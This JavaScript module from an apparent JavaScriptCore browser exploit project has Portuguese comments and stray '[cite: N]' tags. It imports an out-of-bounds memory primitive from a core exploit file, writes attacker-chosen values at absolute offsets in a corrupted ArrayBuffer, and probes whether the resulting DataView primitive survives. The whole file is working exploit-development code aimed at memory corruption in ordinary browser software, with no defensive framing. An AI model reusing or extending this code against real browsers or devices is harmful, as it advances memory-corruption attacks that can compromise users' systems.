// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs'; // [cite: 502]
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real, // Importa oob_dataview_real [cite: 502]
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, KNOWN_STRUCTURE_IDS } from '../config.mjs'; // [cite: 503]

// Não precisaremos do contador de toJSON para este teste específico [cite: 503]
// let callCount_toJSON_tc = 0;

async function executeSingleJsonTCTest_TestOOBPrimitive( // Nome da função alterado para clareza [cite: 504]
    description,
    corruption_offset,
    value_to_write,
    // enable_pp, // Não relevante para este teste
    // attemptOOBWrite, // A escrita OOB é o foco deste teste
    skipOOBEnvironmentSetup,
    logFn = logS3
) {
    const FNAME_SINGLE_TEST = `executeTestOOBPrimitive<${description}>`;
    logFn(`--- Iniciando Teste da Primitiva OOB: ${description} ---`, "test", FNAME_SINGLE_TEST); // [cite: 505]
    logFn(`   Offset Corrupção: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}, Setup OOB: ${!skipOOBEnvironmentSetup}`, "info", FNAME_SINGLE_TEST); // [cite: 506]

    if (!skipOOBEnvironmentSetup) {
        await triggerOOB_primitive(); // [cite: 507]
        if (!oob_array_buffer_real || !oob_dataview_real) { // Verifica ambos [cite: 508]
            logFn("Falha ao configurar ambiente OOB (buffer ou dataview nulo). Abortando.", "error", FNAME_SINGLE_TEST); // [cite: 508]
            return false; // [cite: 509]
        }
    } else {
        logFn("Setup do ambiente OOB pulado. Este teste requer o setup OOB.", "warn", FNAME_SINGLE_TEST); // [cite: 509]
        if (oob_array_buffer_real) clearOOBEnvironment(); // [cite: 510]
        return false; // Não faz sentido continuar sem o setup OOB [cite: 510]
    }

    // Não criamos victim_ab nem poluímos toJSON para este teste [cite: 510]
    // let victim_ab = new ArrayBuffer(64);
    // logFn(`ArrayBuffer vítima (64 bytes) recriado.`, "info", FNAME_SINGLE_TEST);
    // const ppKey = 'toJSON';
    // let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
    // let pollutionApplied = false;

    let testSucceededSpeculatively = false; // [cite: 512]

    try {
        // Realizar a escrita OOB
        const bytes_to_write_for_corruption = 4; // [cite: 512]
        // Assumindo 4 bytes para 0xFFFFFFFF [cite: 513]
        if (corruption_offset >= 0 && corruption_offset + bytes_to_write_for_corruption <= oob_array_buffer_real.byteLength) {
            logFn(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)} do oob_array_buffer_real`, "warn", FNAME_SINGLE_TEST); // [cite: 513]
            oob_write_absolute(corruption_offset, value_to_write, bytes_to_write_for_corruption); // [cite: 514]
            logFn(`Escrita OOB em ${toHex(corruption_offset)} realizada.`, "info", FNAME_SINGLE_TEST); // [cite: 514]
        } else {
            logFn(`AVISO: Offset de corrupção ${toHex(corruption_offset)} inválido. Escrita OOB não realizada.`, "warn", FNAME_SINGLE_TEST); // [cite: 515]
            // Ainda prossegue para o finally limpar, mas o teste em si não é válido [cite: 516]
        }

        await PAUSE_S3(SHORT_PAUSE_S3); // [cite: 516]

        // Tentar usar a oob_dataview_real APÓS a escrita OOB [cite: 517]
        logFn(`>>> PRESTES A TENTAR USAR oob_dataview_real APÓS escrita OOB em ${toHex(corruption_offset)}...`, "critical", FNAME_SINGLE_TEST); // [cite: 517]
        try {
            // Tenta ler do início da DataView. [cite: 518]
            // O offset 0 aqui é relativo ao início da oob_dataview_real, [cite: 519]
            // que por sua vez começa em OOB_CONFIG.BASE_OFFSET_IN_DV dentro do oob_array_buffer_real. [cite: 519]
            let testRead = oob_dataview_real.getUint32(0, true);  // [cite: 520]
            logFn(`<<< Leitura da oob_dataview_real (offset 0) retornou: ${toHex(testRead)}`, "info", FNAME_SINGLE_TEST); // [cite: 520]
            // Tente ler de outros offsets da dataview também se o primeiro funcionar [cite: 521]
            // testRead = oob_dataview_real.getUint32(4, true); // [cite: 521]
            // logFn(`<<< Leitura da oob_dataview_real (offset 4) retornou: ${toHex(testRead)}`, "info", FNAME_SINGLE_TEST); // [cite: 522]
            logFn("Parece que a oob_dataview_real ainda é utilizável após a escrita OOB.", "good", FNAME_SINGLE_TEST); // [cite: 523]
        } catch (e_dv_op) {
            logFn(`ERRO CRÍTICO ao usar oob_dataview_real APÓS escrita OOB: ${e_dv_op.name} - ${e_dv_op.message}.`, "critical", FNAME_SINGLE_TEST); // [cite: 524]
            logFn(`  ---> SUCESSO ESPECULATIVO: Corrupção da primitiva OOB DETECTADA! <---`, "vuln", FNAME_SINGLE_TEST); // [cite: 525]
            console.error(`Erro ao usar oob_dataview_real (${description}):`, e_dv_op); // [cite: 525]
            testSucceededSpeculatively = true; // [cite: 526]
        }

    } catch (mainIterationError) {
        logFn(`Erro principal na iteração do teste (${description}): ${mainIterationError.message}`, "error", FNAME_SINGLE_TEST); // [cite: 526]
        console.error(mainIterationError); // [cite: 527]
    } finally {
        // Limpeza do ambiente OOB é crucial [cite: 527]
        if (!skipOOBEnvironmentSetup && oob_array_buffer_real) {
            clearOOBEnvironment(); // [cite: 527]
        }
    }
    logFn(`--- Teste da Primitiva OOB Concluído: ${description} (Sucesso Especulativo de Corrupção da Primitiva: ${testSucceededSpeculatively}) ---`, "test", FNAME_SINGLE_TEST); // [cite: 528]
    return testSucceededSpeculatively; // [cite: 529]
}

// Função exportada para rodar este teste específico [cite: 529]
// Os parâmetros enablePP e attemptOOBWrite são implicitamente verdadeiros ou irrelevantes para este teste específico
export async function runTestCorruptOOBPrimitive(description, corruptionOffset, valueToWrite) {
    // skipOOBEnvironmentSetup é false por padrão, pois o teste precisa do ambiente OOB [cite: 529]
    return await executeSingleJsonTCTest_TestOOBPrimitive(description, corruptionOffset, valueToWrite, false, logS3);
}

// Mantemos a função antiga para não quebrar importações, mas ela não será o foco [cite: 530]
export async function testJsonTypeConfusionUAFSpeculative() {
    logS3("Função testJsonTypeConfusionUAFSpeculative NÃO RECOMENDADA para este teste. Use runTestCorruptOOBPrimitive.", "warn"); // [cite: 530]
}
